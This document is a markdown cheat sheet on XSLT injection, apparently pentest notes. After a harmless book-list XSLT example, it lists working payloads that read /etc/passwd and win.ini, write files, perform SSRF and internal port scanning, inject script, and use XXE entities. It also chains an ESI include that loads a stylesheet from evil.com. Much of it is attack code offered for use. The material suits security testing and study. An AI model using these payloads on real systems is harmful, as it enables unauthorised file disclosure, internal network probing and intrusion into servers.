# XSLT
XSLT can transform XML data into various output formats (HTML, XML, etc.).

## How to use
- xml data
```xml
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="style.xsl"?>
<books>
  <book>
    <title>The Witcher</title>
    <author>Andrzej Sapkowski</author>
    <genre>Fantasy</genre>
  </book>
  <book>
    <title>The Lord of the Rings</title>
    <author>J.R.R. Tolkien</author>
    <genre>Fantasy</genre>
  </book>
</books>

```
- xslt file (style.xsl)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <!-- Define the output as HTML -->
  <xsl:output method="html" encoding="UTF-8" indent="yes" />

  <!-- Template that matches the root element 'books' -->
  <xsl:template match="/books">
    <html>
      <head>
        <title>Book List</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 20px;
          }
          h1 {
            color: #333;
          }
          .book {
            border: 1px solid #ddd;
            padding: 10px;
            margin-bottom: 10px;
            background-color: #fff;
          }
          .title {
            font-size: 18px;
            font-weight: bold;
          }
          .author {
            font-style: italic;
          }
          .genre {
            color: #666;
          }
        </style>
      </head>
      <body>
        <h1>Book List</h1>
        <!-- Loop through each 'book' element in the XML -->
        <xsl:for-each select="book">
          <div class="book">
            <div class="title">
              <xsl:value-of select="title" />
            </div>
            <div class="author">
              <xsl:value-of select="author" />
            </div>
            <div class="genre">
              <xsl:value-of select="genre" />
            </div>
          </div>
        </xsl:for-each>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>

```

## where to find 
In order to exploit this kind of vulnerability you need to be able to store xsl tags in the server side and then access that content

### inject xml file with malicious xslt 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<data>
  <name>John Doe</name>
  <age>30</age>
  <description>
    This is an example of embedded XSLT.
  </description>

  <!-- Embedded XSLT Stylesheet -->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
</data>

```

### chain with `est injection` attack 
```html
<esi:include src="http://website.com/" stylesheet="http://evil.com/esi.xsl">
</esi:include>
```


## detection


```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html"/>
<xsl:template match="/">
    <h2>XSLT identification</h2>
    <b>Version:</b> <xsl:value-of select="system-property('xsl:version')"/><br/>
    <b>Vendor:</b> <xsl:value-of select="system-property('xsl:vendor')" /><br/>
    <b>Vendor URL:</b><xsl:value-of select="system-property('xsl:vendor-url')" /><br/>
</xsl:template>
</xsl:stylesheet>
```


## read file


```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```
## write to file 
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:result-document href="local_file.txt">
<xsl:text>Write Local File</xsl:text>
</xsl:result-document>
</xsl:template>
</xsl:stylesheet>
```

## SSRF

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:5000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```

## js injection
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<script>confirm("We're good");</script>
</xsl:template>
</xsl:stylesheet>
```

## xxe
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
&ext_file;
</xsl:template>
</xsl:stylesheet>
```

## using http 
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="document('/etc/passwd')"/> // get local file
<xsl:value-of select="document('http://172.16.132.1:25')"/>  //port scaning
<xsl:value-of select="document('file:///c:/winnt/win.ini')"/>
</xsl:template>
</xsl:stylesheet>
```

## RCE 
- some times xslt can lead to RCE in certain condtions

check this [documentation](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection#C%23%2FVB.NET%2FASP.NET)

## tools 

- use tool saxonb-xslt to parse xml

```bash
saxonb-xslt -xsl:transformation.xsl catalogue.xml
```
